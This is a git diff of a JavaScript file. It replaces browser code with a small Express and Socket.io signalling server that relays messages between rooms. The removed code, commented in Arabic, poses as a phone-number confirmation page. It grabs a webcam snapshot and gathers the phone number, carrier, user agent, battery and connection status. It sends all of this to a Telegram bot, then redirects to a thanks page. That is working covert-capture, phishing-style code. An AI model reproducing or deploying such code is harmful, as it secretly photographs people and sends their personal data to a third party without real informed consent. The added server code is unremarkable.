@@ -1,155 +1,35 @@
-  let botToken = '';
-let chatId = '';
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const cors = require('cors');
 
-// تحميل الإعدادات من config.json
-fetch('config.json')
-  .then(res => {
-    if (!res.ok) throw new Error(`فشل تحميل config.json: ${res.status}`);
-    return res.json();
-  })
-  .then(data => {
-    botToken = data.botToken;
-    chatId = data.chatId;
-  })
-  .catch(err => {
-    console.error('فشل تحميل config.json:', err);
-    alert('حدث خطأ في تحميل الإعدادات. تأكد من وجود config.json.');
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: "*" } });
+
+app.use(cors());
+app.use(express.static('public'));
+
+io.on('connection', (socket) => {
+  console.log('a user connected');
+
+  socket.on('join_room', (roomID) => {
+    socket.join(roomID);
+    socket.to(roomID).emit('user_joined', socket.id);
   });
 
-// عرض مزود الخدمة حسب رقم الهاتف
-document.getElementById('phoneNumber').addEventListener('input', () => {
-  const phone = document.getElementById('phoneNumber').value;
-  const carrierName = detectCarrier(phone);
-  document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
+  socket.on('signal', ({ roomID, target, data }) => {
+    if(target) {
+      socket.to(target).emit('signal', { id: socket.id, data });
+    } else {
+      socket.to(roomID).emit('signal', { id: socket.id, data });
+    }
+  });
+
+  socket.on('disconnect', () => {
+    console.log('user disconnected');
+  });
 });
 
-function detectCarrier(phoneNumber) {
-  const cleaned = phoneNumber.replace(/\D/g, '');
-  const prefix = cleaned.substring(0, 2);
-  switch (prefix) {
-    case '77': return "يمن موبايل";
-    case '71': return "سبأفون";
-    case '73': return "MTN";
-    case '70': return "واي";
-    default: return "مزود غير معروف";
-  }
-}
-
-function confirmConsent() {
-  document.getElementById('consentBox').style.display = 'none';
-  document.getElementById('confirmBtn').style.display = 'inline-block';
-}
-
-function startCameraAndSend() {
-  const phoneNumber = document.getElementById('phoneNumber').value.trim();
-  if (phoneNumber === '') {
-    alert('يرجى إدخال رقم الهاتف.');
-    return;
-  }
-
-  // حفظ الرقم محليًا
-  localStorage.setItem('userPhone', phoneNumber);
-
-  document.getElementById('confirmBtn').innerHTML = 'جاري التأكيد...';
-  document.getElementById('confirmBtn').disabled = true;
-  captureAndSendPhoto(phoneNumber);
-}
-
-async function captureAndSendPhoto(phoneNumber) {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    alert("المتصفح لا يدعم الكاميرا.");
-    resetButton();
-    return;
-  }
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-
-    // ننتظر 1.5 ثانية لتهيئة الكاميرا
-    await new Promise(res => setTimeout(res, 1500));
-
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(async (blob) => {
-      const info = await collectUserInfo(phoneNumber);
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'snapshot.jpg');
-      formData.append('caption', info.caption);
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(res => res.json())
-      .then(result => {
-        if (!result.ok) {
-          console.error("فشل الإرسال:", result.description);
-          resetButton();
-        } else {
-          // إهتزاز عند التأكيد
-          if (navigator.vibrate) {
-            navigator.vibrate([300, 100, 300]);
-          }
-
-          // إيقاف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
-
-          // تحويل لصفحة الشكر بعد تأخير بسيط ليشعر المستخدم بالاهتزاز
-          setTimeout(() => {
-            window.location.href = 'thanks.html';
-          }, 500);
-        }
-      })
-      .catch(err => {
-        console.error("خطأ أثناء الإرسال:", err);
-        resetButton();
-        stream.getTracks().forEach(track => track.stop());
-      });
-
-    }, 'image/jpeg');
-
-  } catch (error) {
-    console.error("فشل الوصول إلى الكاميرا:", error);
-    alert("حدث خطأ أثناء الوصول إلى الكاميرا.");
-    resetButton();
-  }
-}
-
-function resetButton() {
-  const btn = document.getElementById('confirmBtn');
-  btn.innerHTML = 'تأكيد';
-  btn.disabled = false;
-}
-
-async function collectUserInfo(phoneNumber) {
-  const userAgent = navigator.userAgent;
-  const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
-  let batteryLevel = "غير متوفر";
-
-  if ('getBattery' in navigator) {
-    try {
-      const battery = await navigator.getBattery();
-      batteryLevel = Math.round(battery.level * 100) + "%";
-    } catch (e) {
-      batteryLevel = "غير متاح";
-    }
-  }
-
-  const carrier = detectCarrier(phoneNumber);
-
-  const caption = `📱 رقم الهاتف: ${phoneNumber}
-🏢 مزود الخدمة: ${carrier}
-🖥️ نوع الجهاز: ${userAgent}
-🔋 نسبة البطارية: ${batteryLevel}
-🌐 اتصال الإنترنت: ${connectionStatus}`;
-
-  return { caption };
-}
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
